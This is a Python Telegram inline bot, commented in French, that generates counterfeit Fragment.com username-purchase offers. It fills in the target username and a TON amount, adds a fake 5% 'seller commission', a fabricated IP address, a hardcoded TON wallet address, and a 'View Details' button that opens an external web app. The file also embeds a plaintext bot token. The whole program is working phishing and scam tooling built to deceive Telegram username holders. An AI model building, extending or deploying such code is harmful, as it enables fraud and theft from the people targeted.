import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")
print(f"📱 Web App: {WEBAPP_URL}")

# Variables globales
app = None
event_loop = None

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    try:
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        query = update.inline_query.query.strip() if update.inline_query.query else ""
        
        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
        if not query:
            await update.inline_query.answer([], cache_time=0, is_personal=True)
            return
        
        # Parsing de la requête (username montant)
        parts = query.split()
        
        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
        if len(parts) < 2:
            await update.inline_query.answer([], cache_time=0, is_personal=True)
            return
        
        username = parts[0].replace('@', '')  # Supprime @ si présent
        
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                raise ValueError("Montant doit être positif")
        except ValueError:
            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
            await update.inline_query.answer([], cache_time=0, is_personal=True)
            return
        
        # Génération du message avec le format exact du bot original
        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
        
        # Prix actuel pour l'affichage
        current_ton_price = get_ton_price()
        current_usd_value = ton_amount * current_ton_price
        
        # Résultat inline - SEULEMENT si format correct
        results = [
            InlineQueryResultArticle(
                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
                title=f"Fragment Deal: @{username}",
                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                input_message_content=InputTextMessageContent(
                    fragment_message,
                    entities=entities,
                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
                ),
                reply_markup=keyboard
            )
        ]
        
        await update.inline_query.answer(results, cache_time=0, is_personal=True)
        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON")
        
    except Exception as e:
        print(f"❌ Erreur dans inline_query_handler: {e}")
        await update.inline_query.answer([], cache_time=0, is_personal=True)

def get_ton_price():
    """Récupère le prix actuel du TON depuis Coingecko"""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read())
            return float(data['the-open-network']['usd'])
    except Exception as e:
        print(f"⚠️ Erreur récupération prix TON: {e}")
        return 5.5  # Prix de fallback si API indisponible

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel - récupération en temps réel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment - IDENTIQUE au bot original
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    # Création des entités pour le formatage
    entities = []
    
    # 1. Offer Amount en gras
    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
    offer_start = fragment_message.find(offer_text)
    if offer_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=offer_start,
            length=len(offer_text)
        ))
    
    # 2. Commission en gras
    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
    commission_start = fragment_message.find(commission_text)
    if commission_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=commission_start,
            length=len(commission_text)
        ))
    
    # 3. Premier point Important en gras
    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
    important_start1 = fragment_message.find(important_text1)
    if important_start1 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start1,
            length=len(important_text1)
        ))
    
    # 4. Deuxième point Important en gras  
    important_text2 = "• If you choose not to proceed, simply ignore this message."
    important_start2 = fragment_message.find(important_text2)
    if important_start2 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start2,
            length=len(important_text2)
        ))
    
    # 5. Adresse wallet en monospace (code)
    wallet_start = fragment_message.find(wallet_address)
    if wallet_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.CODE,
            offset=wallet_start,
            length=len(wallet_address)
        ))
        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
    
    # 📱 BOUTON WEB APP INTÉGRÉ - Reste dans Telegram
    webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton(
            "View Details", 
            web_app=WebAppInfo(url=webapp_url)
        )
    ]])
    
    print(f"🔗 Web App URL générée (intégrée): {webapp_url}")
    
    return fragment_message, entities, keyboard

class WebhookHandler(BaseHTTPRequestHandler):
    """Gestionnaire des requêtes webhook de Telegram"""
    
    def do_POST(self):
        """Traite les webhooks POST de Telegram"""
        if self.path == f'/{BOT_TOKEN}':
            try:
                # Lecture des données POST
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                
                # Parse et traitement
                update_data = json.loads(post_data.decode('utf-8'))
                update = Update.de_json(update_data, app.bot)
                
                # Traitement asynchrone
                asyncio.run_coroutine_threadsafe(
                    app.process_update(update),
                    event_loop
                )
                
                # Réponse HTTP
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
                
                print(f"📨 Webhook traité: {update.update_id}")
                
            except Exception as e:
                print(f"❌ Erreur webhook: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(f"Error: {e}".encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')
    
    def do_GET(self):
        """Endpoint de vérification de santé"""
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            status = {
                "status": "healthy",
                "bot": "Fragment Deal Generator v4.7",
                "timestamp": int(time.time())
            }
            self.wfile.write(json.dumps(status).encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')
    
    def log_message(self, format, *args):
        """Log personnalisé (désactivé pour réduire le bruit)"""
        pass

async def setup_webhook():
    """Configuration du webhook Telegram"""
    global app, event_loop
    
    try:
        # Création de l'application Telegram
        app = Application.builder().token(BOT_TOKEN).build()
        
        # 🎯 AJOUT DU GESTIONNAIRE INLINE
        app.add_handler(InlineQueryHandler(inline_query_handler))
        print("✅ Handler inline query ajouté")
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        
        await app.bot.set_webhook(
            url=webhook_url,
            allowed_updates=["inline_query"]  # Seulement les requêtes inline
        )
        
        print(f"✅ Webhook Telegram configuré: {webhook_url}")
        
        # Informations du bot
        me = await app.bot.get_me()
        print(f"🤖 Bot connecté: @{me.username} ({me.first_name})")
        
        return True
        
    except Exception as e:
        print(f"❌ Erreur setup webhook: {e}")
        return False

async def start_bot():
    """Démarrage principal du bot"""
    global event_loop
    
    print("🚀 Démarrage du bot Fragment Deal Generator...")
    
    # Configuration du webhook
    webhook_ready = await setup_webhook()
    if not webhook_ready:
        print("❌ Impossible de configurer le webhook")
        return
    
    # Serveur HTTP pour les webhooks
    event_loop = asyncio.get_event_loop()
    
    def run_http_server():
        """Lance le serveur HTTP dans un thread séparé"""
        try:
            server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
            print(f"🌐 Serveur HTTP démarré sur 0.0.0.0:{PORT}")
            server.serve_forever()
        except Exception as e:
            print(f"❌ Erreur serveur HTTP: {e}")
    
    # Démarrage du serveur dans un thread
    server_thread = threading.Thread(target=run_http_server, daemon=True)
    server_thread.start()
    
    print("✅ Bot inline Fragment Deal Generator opérationnel !")
    print(f"📝 Usage: @{(await app.bot.get_me()).username} <username> <montant_TON>")
    
    # Maintien du bot en vie
    try:
        while True:
            await asyncio.sleep(60)
            print(f"💓 Bot actif - {time.strftime('%Y-%m-%d %H:%M:%S')}")
    except KeyboardInterrupt:
        print("🛑 Arrêt demandé...")
    except Exception as e:
        print(f"❌ Erreur inattendue: {e}")

def main():
    """Point d'entrée principal"""
    try:
        # Démarrage asynchrone
        asyncio.run(start_bot())
    except KeyboardInterrupt:
        print("\n🛑 Bot arrêté par l'utilisateur")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")
    finally:
        print("👋 Arrêt du Fragment Deal Generator")

if __name__ == '__main__':
    main()
